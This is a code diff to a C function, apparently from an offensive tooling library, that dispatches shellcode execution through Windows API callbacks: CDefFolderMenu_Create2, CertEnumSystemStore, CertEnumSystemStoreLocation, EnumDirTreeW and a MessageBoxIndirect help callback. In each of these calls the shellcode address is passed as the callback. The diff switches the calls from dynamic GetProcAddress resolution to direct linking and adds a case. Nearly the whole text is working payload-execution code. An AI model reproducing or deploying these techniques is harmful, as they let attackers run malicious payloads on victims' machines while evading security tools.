@@ -17,18 +17,9 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 	{
 		case E_CDEFFOLDERMENU_CREATE2:
 		{
-			CDEFFOLDERMENU_CREATE2 CDefFolderMenu_Create2 = NULL;
-			PVOID ContextMenuRequired = NULL;
+			IContextMenu* ContextMenuRequired = NULL;
 
-			hModule = TryLoadDllMultiMethodW((PWCHAR)L"Shell32.dll");
-			if (!hModule)
-				goto EXIT_ROUTINE;
-
-			CDefFolderMenu_Create2 = (CDEFFOLDERMENU_CREATE2)GetProcAddressA((DWORD64)hModule, "CDefFolderMenu_Create2");
-			if (!CDefFolderMenu_Create2)
-				goto EXIT_ROUTINE;
-
-			if (!SUCCEEDED(CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, BinAddress, 0, NULL, &ContextMenuRequired)))
+			if (!SUCCEEDED(CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, (LPFNDFMCALLBACK)BinAddress, 0, NULL, &ContextMenuRequired)))
 				goto EXIT_ROUTINE;
 
 			break;
@@ -36,16 +27,6 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 
 		case E_CERTENUMSYSTEMSTORE:
 		{
-			CERTENUMSYSTEMSTORE CertEnumSystemStore = NULL;
-
-			hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
-			if (!hModule)
-				goto EXIT_ROUTINE;
-
-			CertEnumSystemStore = (CERTENUMSYSTEMSTORE)GetProcAddressA((DWORD64)hModule, "CertEnumSystemStore");
-			if (!CertEnumSystemStore)
-				goto EXIT_ROUTINE;
-
 			if (!CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)BinAddress))
 				goto EXIT_ROUTINE;
 
@@ -54,15 +35,6 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 		
 		case E_CERTENUMSYSTEMSTORELOCATION:
 		{
-			CERTENUMSYSTEMSTORELOCATION CertEnumSystemStoreLocation = NULL;
-
-			hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
-			if (!hModule)
-				goto EXIT_ROUTINE;
-
-			CertEnumSystemStoreLocation = (CERTENUMSYSTEMSTORELOCATION)GetProcAddressA((DWORD64)hModule, "CertEnumSystemStoreLocation");
-			if (!CertEnumSystemStoreLocation)
-				goto EXIT_ROUTINE;
 
 			if (CertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)BinAddress))
 				goto EXIT_ROUTINE;
@@ -109,26 +81,12 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 
 		case E_ENUMDIRTREEW:
 		{
-			SYMINITIALIZEW SymInitialize = NULL;
-			SYMCLEANUP SymCleanup = NULL;
-			ENUMDIRTREEW EnumDirTree = NULL;
 			WCHAR DisposeableBuffer[512] = { 0 };
-
-			hModule = TryLoadDllMultiMethodW((PWCHAR)L"dbghelp.dll");
-			if (hModule == NULL)
-				goto EXIT_ROUTINE;
-
-			SymInitialize = (SYMINITIALIZEW)GetProcAddressA((DWORD64)hModule, "SymInitializeW");
-			SymCleanup = (SYMCLEANUP)GetProcAddressA((DWORD64)hModule, "SymCleanup");
-			EnumDirTree = (ENUMDIRTREEW)GetProcAddressA((DWORD64)hModule, "EnumDirTreeW");
-
-			if (!SymInitialize || !SymCleanup || !EnumDirTree)
-				goto EXIT_ROUTINE;
 
 			if (!SymInitialize(InlineGetCurrentProcess, NULL, TRUE))
 				goto EXIT_ROUTINE;
 
-			EnumDirTree(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, BinAddress, NULL);
+			EnumDirTreeW(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, (PENUMDIRTREE_CALLBACKW)BinAddress, NULL);
 
 			SymCleanup(InlineGetCurrentProcess);
 
@@ -259,8 +217,14 @@ DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
 			MessageBoxParams.lpszText = L"[Unstable] Help Executes Shellcode";
 
 			MessageBoxIndirect(&MessageBoxParams);
+
+			break;
 		}
 
+		case E_PERFSTARTPROVIDEREX:
+		{
+			goto EXIT_ROUTINE;
+		}
 		default:
 			goto EXIT_ROUTINE;
 
